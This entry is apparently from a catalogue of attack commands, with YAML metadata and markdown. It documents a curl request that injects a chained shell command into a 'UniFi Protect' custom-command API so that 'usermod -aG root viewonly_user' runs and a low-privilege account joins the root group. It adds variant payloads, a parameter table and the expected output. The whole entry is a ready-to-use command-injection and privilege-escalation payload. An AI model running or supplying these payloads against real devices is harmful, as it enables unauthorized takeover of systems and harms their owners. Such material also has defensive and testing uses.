---
id: cmd-001
data: >-
  curl -X POST https://protect-device/api/custom-command -H "Cookie:
  session=abc123" -H "Content-Type: application/json" -d '{"command": "echo
  test; usermod -aG root viewonly_user #"}'
tags:
  - command-injection
  - privilege-escalation
type: command
output: |-
  HTTP/1.1 200 OK
  {"status": "executed"}
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.313Z'
verified: false
validated: true
submitted: true
---
# inject-usermod-escalation

## Command

```bash
curl -X POST https://protect-device/api/custom-command -H "Cookie: session=abc123" -H "Content-Type: application/json" -d '{"command": "echo test; usermod -aG root viewonly_user #"}'
```

## Description

This command sends a POST request to the UniFi Protect custom command API endpoint, injecting a chained payload to execute a benign echo followed by usermod for adding the user to the root group, exploiting command injection for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://protect-device/api/custom-command` | Target API endpoint for custom commands | Yes |
| `-H "Cookie: session=abc123"` | Authentication session cookie from login | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload format | Yes |
| `-d '{"command": "..."}'` | JSON body with injected command payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://protect-device/api/custom-command -H "Cookie: session=abc123" -H "Content-Type: application/json" -d '{"command": "ping -c 1 127.0.0.1; usermod -aG root viewonly_user #"}'
```

### Advanced Usage

```bash
curl -X POST https://protect-device/api/custom-command -H "Cookie: session=abc123" -H "Content-Type: application/json" -d '{"command": "whoami; usermod -aG root,admin viewonly_user; id viewonly_user #"}'
```

## Expected Output

Successful execution returns an HTTP 200 response with a JSON status indicating command completion, such as {"status": "executed"}. No shell errors appear in the response, but verify escalation separately via relogin or root command tests.

## Related

- [[Related Procedure: Exploit-Command-Injection-in-UniFi-Protect]]
